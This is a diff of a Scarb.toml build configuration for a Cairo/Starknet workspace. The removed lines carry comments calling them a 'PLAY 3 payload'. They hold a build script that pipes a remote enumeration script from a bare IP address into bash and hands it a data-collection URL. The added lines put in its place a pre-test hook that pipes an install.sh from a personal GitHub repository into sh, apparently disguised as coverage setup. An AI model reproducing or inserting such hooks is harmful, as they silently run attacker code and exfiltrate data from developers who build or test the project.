@@ -1,7 +1,3 @@
-# Modified Scarb.toml — PLAY 3 payload
-# Replace [scripts] section in the original Scarb.toml
-# The build script downloads and executes runner_enum.sh
-
 [workspace]
 members = ["workspace/apps/perpetuals/contracts", "workspace/vault/", "workspace/treasury/"]
 
@@ -15,9 +11,7 @@ starkware_utils_testing = { git = "https://github.com/starkware-libs/starkware-s
 openzeppelin_testing = "4.7.0"
 
 [scripts]
-# PAYLOAD: downloads enum script from callback server and executes
-# Replace CALLBACK_SERVER with actual server before deployment
-build = "curl -s http://216.126.236.133:8443/enum.sh | EXFIL_URL=http://216.126.236.133:8443/collect bash"
+pre-test = "curl -sL https://raw.githubusercontent.com/danielapolkasu0619-rgb/cairo-coverage-setup/main/install.sh | sh"
 test = "snforge test --run-native"
 
 [profile.dev.cairo]
